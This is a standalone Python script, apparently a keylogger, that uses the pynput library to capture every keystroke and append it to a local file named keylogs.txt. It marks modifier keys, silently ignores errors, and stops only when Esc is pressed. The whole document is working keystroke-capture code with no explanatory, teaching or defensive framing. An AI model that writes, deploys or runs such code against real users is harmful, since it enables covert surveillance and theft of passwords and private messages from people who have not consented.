import os
from pynput import keyboard

log_file = "keylogs.txt"

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.shift or key == keyboard.Key.ctrl or key == keyboard.Key.alt:
                f.write(f'[{key.name.upper()}]')
            else:
                f.write(key.char)
    except Exception as e:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with open(log_file, 'w') as f:
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except Exception as e:
        pass